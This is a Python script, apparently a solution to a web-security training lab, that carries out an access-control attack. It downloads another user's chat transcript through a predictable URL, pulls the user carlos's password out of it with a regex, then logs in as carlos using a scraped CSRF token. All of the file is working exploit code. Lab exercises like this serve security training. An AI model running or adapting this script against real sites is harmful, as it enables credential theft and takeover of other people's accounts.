import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    html = BeautifulSoup(
        response.text,
        'html.parser')
    csrf = html.find(
        "input", {'name': 'csrf'})['value']
    return csrf

def get_carlos_password(url, session):
    chat_url = url + "download-transcript/1.txt"
    response = session.get(
        chat_url,
        verify=False,
        proxies=proxies
    )
    if 'password' in response.text:
        carlos_password = re.findall(
            r'password is (.*)\.',
            response.text
        )[0]
        return carlos_password
    raise ValueError("Carlos' password not found")

def is_login_successful(url, session, password):
    login_url = url + "/login"
    csrf_token = get_csrf_token(
        login_url, session)
    data_login = {
        "username": "carlos",
        "password": password,
        "csrf" : csrf_token
    }
    response = session.post(
        login_url,
        data=data_login,
        verify=False,
        proxies=proxies
    )
    return "Log out" in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        session = requests.Session()
        print("[+] Starting Access Control attack...")
        password = get_carlos_password(url, session)
        print("[+] Carlos' password is %s" % password)
        if not is_login_successful(url, session, password):
            print("[-] Login was not successful.")
            sys.exit(FAIL)
        print("[=] Sucessfully logged into Carlos' account")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Access Control attack was not successful.")
        sys.exit(FAIL) 